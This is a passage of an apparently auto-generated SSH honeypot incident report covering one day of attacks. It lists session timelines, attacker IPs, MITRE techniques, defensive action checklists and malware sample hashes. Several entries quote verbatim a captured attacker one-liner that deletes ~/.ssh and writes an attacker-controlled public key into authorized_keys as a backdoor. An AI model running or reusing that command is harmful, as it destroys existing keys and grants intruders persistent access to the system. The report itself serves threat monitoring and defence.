| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:33:31` | `cowrie.session.connect` |
| `2026-06-04 16:33:31` | `cowrie.client.version` |
| `2026-06-04 16:33:32` | `cowrie.client.kex` |
| `2026-06-04 16:33:32` | `cowrie.login.success` |
| `2026-06-04 16:33:32` | `cowrie.session.params` |
| `2026-06-04 16:33:32` | `cowrie.command.input` |
| `2026-06-04 16:33:32` | `cowrie.command.failed` |
| `2026-06-04 16:33:32` | `cowrie.log.closed` |
| `2026-06-04 16:33:32` | `cowrie.session.params` |
| `2026-06-04 16:33:32` | `cowrie.command.input` |
| `2026-06-04 16:33:32` | `cowrie.session.file_download` |
| `2026-06-04 16:33:32` | `cowrie.log.closed` |
| `2026-06-04 16:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f786c1be8cc

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:33 |
| **Last Seen** | 2026-06-04 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:33:34` | `cowrie.session.connect` |
| `2026-06-04 16:33:34` | `cowrie.client.version` |
| `2026-06-04 16:33:34` | `cowrie.client.kex` |
| `2026-06-04 16:33:34` | `cowrie.login.success` |
| `2026-06-04 16:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-010ee056fa0b

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 16:36 |
| **Last Seen** | 2026-06-04 16:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:36:14` | `cowrie.session.connect` |
| `2026-06-04 16:36:14` | `cowrie.client.version` |
| `2026-06-04 16:36:14` | `cowrie.client.kex` |
| `2026-06-04 16:36:15` | `cowrie.login.success` |
| `2026-06-04 16:36:15` | `cowrie.session.params` |
| `2026-06-04 16:36:15` | `cowrie.command.input` |
| `2026-06-04 16:36:15` | `cowrie.command.failed` |
| `2026-06-04 16:36:15` | `cowrie.log.closed` |
| `2026-06-04 16:36:15` | `cowrie.session.params` |
| `2026-06-04 16:36:15` | `cowrie.command.input` |
| `2026-06-04 16:36:15` | `cowrie.session.file_download` |
| `2026-06-04 16:36:15` | `cowrie.log.closed` |
| `2026-06-04 16:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e06739617cc

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 16:36 |
| **Last Seen** | 2026-06-04 16:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:36:18` | `cowrie.session.connect` |
| `2026-06-04 16:36:18` | `cowrie.client.version` |
| `2026-06-04 16:36:18` | `cowrie.client.kex` |
| `2026-06-04 16:36:18` | `cowrie.login.success` |
| `2026-06-04 16:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d831c8114640

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:44 |
| **Last Seen** | 2026-06-04 16:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:44:20` | `cowrie.session.connect` |
| `2026-06-04 16:44:20` | `cowrie.client.version` |
| `2026-06-04 16:44:20` | `cowrie.client.kex` |
| `2026-06-04 16:44:20` | `cowrie.login.success` |
| `2026-06-04 16:44:21` | `cowrie.session.params` |
| `2026-06-04 16:44:21` | `cowrie.command.input` |
| `2026-06-04 16:44:21` | `cowrie.command.failed` |
| `2026-06-04 16:44:21` | `cowrie.log.closed` |
| `2026-06-04 16:44:21` | `cowrie.session.params` |
| `2026-06-04 16:44:21` | `cowrie.command.input` |
| `2026-06-04 16:44:21` | `cowrie.session.file_download` |
| `2026-06-04 16:44:21` | `cowrie.log.closed` |
| `2026-06-04 16:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7784b673e84f

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:44 |
| **Last Seen** | 2026-06-04 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:44:23` | `cowrie.session.connect` |
| `2026-06-04 16:44:23` | `cowrie.client.version` |
| `2026-06-04 16:44:23` | `cowrie.client.kex` |
| `2026-06-04 16:44:23` | `cowrie.login.success` |
| `2026-06-04 16:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a318e2b19b90

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 16:49 |
| **Last Seen** | 2026-06-04 16:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:49:06` | `cowrie.session.connect` |
| `2026-06-04 16:49:06` | `cowrie.client.version` |
| `2026-06-04 16:49:06` | `cowrie.client.kex` |
| `2026-06-04 16:49:07` | `cowrie.login.success` |
| `2026-06-04 16:49:07` | `cowrie.session.params` |
| `2026-06-04 16:49:07` | `cowrie.command.input` |
| `2026-06-04 16:49:07` | `cowrie.command.failed` |
| `2026-06-04 16:49:07` | `cowrie.log.closed` |
| `2026-06-04 16:49:08` | `cowrie.session.params` |
| `2026-06-04 16:49:08` | `cowrie.command.input` |
| `2026-06-04 16:49:08` | `cowrie.session.file_download` |
| `2026-06-04 16:49:08` | `cowrie.log.closed` |
| `2026-06-04 16:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ff8e4673b0

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 16:49 |
| **Last Seen** | 2026-06-04 16:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:49:10` | `cowrie.session.connect` |
| `2026-06-04 16:49:10` | `cowrie.client.version` |
| `2026-06-04 16:49:10` | `cowrie.client.kex` |
| `2026-06-04 16:49:11` | `cowrie.login.success` |
| `2026-06-04 16:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92df47102c55

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:50 |
| **Last Seen** | 2026-06-04 16:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:50:55` | `cowrie.session.connect` |
| `2026-06-04 16:50:55` | `cowrie.client.version` |
| `2026-06-04 16:50:55` | `cowrie.client.kex` |
| `2026-06-04 16:50:55` | `cowrie.login.success` |
| `2026-06-04 16:50:55` | `cowrie.session.params` |
| `2026-06-04 16:50:55` | `cowrie.command.input` |
| `2026-06-04 16:50:55` | `cowrie.command.failed` |
| `2026-06-04 16:50:55` | `cowrie.log.closed` |
| `2026-06-04 16:50:55` | `cowrie.session.params` |
| `2026-06-04 16:50:55` | `cowrie.command.input` |
| `2026-06-04 16:50:55` | `cowrie.session.file_download` |
| `2026-06-04 16:50:55` | `cowrie.log.closed` |
| `2026-06-04 16:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16cc2b329247

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:50 |
| **Last Seen** | 2026-06-04 16:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:50:57` | `cowrie.session.connect` |
| `2026-06-04 16:50:57` | `cowrie.client.version` |
| `2026-06-04 16:50:57` | `cowrie.client.kex` |
| `2026-06-04 16:50:57` | `cowrie.login.success` |
| `2026-06-04 16:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3aa89f40ae1

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:53 |
| **Last Seen** | 2026-06-04 16:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:53:11` | `cowrie.session.connect` |
| `2026-06-04 16:53:11` | `cowrie.client.version` |
| `2026-06-04 16:53:11` | `cowrie.client.kex` |
| `2026-06-04 16:53:12` | `cowrie.login.success` |
| `2026-06-04 16:53:12` | `cowrie.session.params` |
| `2026-06-04 16:53:12` | `cowrie.command.input` |
| `2026-06-04 16:53:12` | `cowrie.command.failed` |
| `2026-06-04 16:53:12` | `cowrie.log.closed` |
| `2026-06-04 16:53:12` | `cowrie.session.params` |
| `2026-06-04 16:53:12` | `cowrie.command.input` |
| `2026-06-04 16:53:12` | `cowrie.session.file_download` |
| `2026-06-04 16:53:12` | `cowrie.log.closed` |
| `2026-06-04 16:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cab6392385c

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:53 |
| **Last Seen** | 2026-06-04 16:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:53:14` | `cowrie.session.connect` |
| `2026-06-04 16:53:14` | `cowrie.client.version` |
| `2026-06-04 16:53:14` | `cowrie.client.kex` |
| `2026-06-04 16:53:14` | `cowrie.login.success` |
| `2026-06-04 16:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93548c9b6f24

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:55 |
| **Last Seen** | 2026-06-04 16:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:55:14` | `cowrie.session.connect` |
| `2026-06-04 16:55:14` | `cowrie.client.version` |
| `2026-06-04 16:55:14` | `cowrie.client.kex` |
| `2026-06-04 16:55:14` | `cowrie.login.success` |
| `2026-06-04 16:55:15` | `cowrie.session.params` |
| `2026-06-04 16:55:15` | `cowrie.command.input` |
| `2026-06-04 16:55:15` | `cowrie.command.failed` |
| `2026-06-04 16:55:15` | `cowrie.log.closed` |
| `2026-06-04 16:55:15` | `cowrie.session.params` |
| `2026-06-04 16:55:15` | `cowrie.command.input` |
| `2026-06-04 16:55:15` | `cowrie.session.file_download` |
| `2026-06-04 16:55:15` | `cowrie.log.closed` |
| `2026-06-04 16:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13e2821eba87

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 16:55 |
| **Last Seen** | 2026-06-04 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:55:17` | `cowrie.session.connect` |
| `2026-06-04 16:55:17` | `cowrie.client.version` |
| `2026-06-04 16:55:17` | `cowrie.client.kex` |
| `2026-06-04 16:55:17` | `cowrie.login.success` |
| `2026-06-04 16:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `72.47.208[.]106` | **89** | 2026-06-04 13:19 | 2026-06-04 16:37 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `45.66.156[.]214` | **53** | 2026-06-04 12:51 | 2026-06-04 16:45 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `45.172.152[.]74` | **20** | 2026-06-04 14:14 | 2026-06-04 15:00 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.198.113[.]29` | **14** | 2026-06-04 16:19 | 2026-06-04 16:55 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.67.80[.]61` | **13** | 2026-06-04 16:24 | 2026-06-04 16:55 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `218.27.80[.]178` | **13** | 2026-06-04 13:21 | 2026-06-04 13:26 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `43.173.249[.]11` | **7** | 2026-06-04 12:52 | 2026-06-04 13:05 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `103.233.206[.]154` | **4** | 2026-06-04 12:51 | 2026-06-04 14:05 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `89.58.10[.]55` | **4** | 2026-06-04 16:03 | 2026-06-04 16:11 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `117.187.180[.]162` | 1 | 2026-06-04 16:18 | 2026-06-04 16:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]93` | 1 | 2026-06-04 15:58 | 2026-06-04 16:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]31` | 1 | 2026-06-04 16:08 | 2026-06-04 16:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.124.88[.]29` | 1 | 2026-06-04 16:02 | 2026-06-04 16:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.148[.]44` | 1 | 2026-06-04 15:11 | 2026-06-04 15:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]32` | 1 | 2026-06-04 13:01 | 2026-06-04 13:01 | 2s | 0 | `T1592` | 🟢 LOW |
| `54.84.191[.]184` | 1 | 2026-06-04 13:12 | 2026-06-04 13:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]50` | 1 | 2026-06-04 13:44 | 2026-06-04 13:44 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
